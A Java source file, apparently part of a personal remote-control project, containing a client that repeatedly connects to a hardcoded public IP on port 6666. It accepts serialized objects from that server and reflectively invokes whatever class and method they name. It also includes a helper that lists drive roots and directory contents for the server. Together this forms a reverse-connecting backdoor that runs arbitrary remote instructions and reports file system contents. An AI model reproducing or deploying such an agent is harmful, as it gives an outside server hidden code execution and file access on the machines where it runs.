package tech.seedhk.socket;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import tech.seedhk.bean.ByteBuffer;
import tech.seedhk.bean.ProxyObject;
import tech.seedhk.utils.FileUtils;

/**
 * 执行命令并发送数据客户端
 * @author Seed
 * 2017年11月24日 上午11:53:45
 */
public class ClientSender {
	
	private static boolean done=false;
	private static boolean firstCon=true;//是否是第一次连接
	
	public static void main(String[] args) {
		Socket s=null;
		while(true){
			try {
				done=false;
				//接收任务(有阻塞)，执行命令(有阻塞)，发送数据
				//s=new Socket("192.168.147.1", 6666);
				s=new Socket("39.108.208.62", 6666);
				System.out.println("发送客户端连接服务器成功");
				InputStream is=new DataInputStream(s.getInputStream());
				byte[] read = ByteBuffer.read(is);
				Object object=null;
				byte[] data=null;
				if(!firstCon){
					ProxyObject po=(ProxyObject) ProxyObject.byte2Bean(read);
					object=ProxyObject.invoke(po.getClassName(), po.getMethodName(), po.getObjects(), String.class);
				}else{
					//String ret=new String(read,"utf-8");
					// data=operate(ret);
					data=ProxyObject.bean2byte(object);
				}
				OutputStream os=new DataOutputStream(s.getOutputStream());
				ByteBuffer buffer=new ByteBuffer();
				if(firstCon){
					//是第一次建立连接
					buffer.write(os, "sender");
					//os.write("sender\n".getBytes());
					//firstCon=false;
				}else{
					buffer.write(os,data);
				}
				os.flush();
				os.close();
				is.close();
				if(firstCon){
					Thread.sleep(4000);
					firstCon=false;
				}
			} catch (Exception e) {
				System.out.println("sender 客户端发生异常");
				e.printStackTrace();
			}finally {
				try {
					s.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		}
	}
	

	private static  byte[] operate(String opr) throws Exception{
		//String opr=new String(buf,"utf-8");
		StringBuilder sb=new StringBuilder();
		if("listRoot".equals(opr)){
			String[] strs=FileUtils.listRoots();
			for(String s:strs){
				sb.append(s).append(" ");
			}
			sb.append("\n");
		}else if(opr.contains("show")){
			String path = opr.substring(4);
			String[] strs=FileUtils.showDire(path);
			for(String s:strs){
				sb.append(s).append(" ");
			}
			sb.append("\n");
		}else{
			sb.append("这是sender端，当前没有接收到请求\n");
		}
		byte[] ret=sb.toString().getBytes();
		//done=true;
		return ret;
	}

}
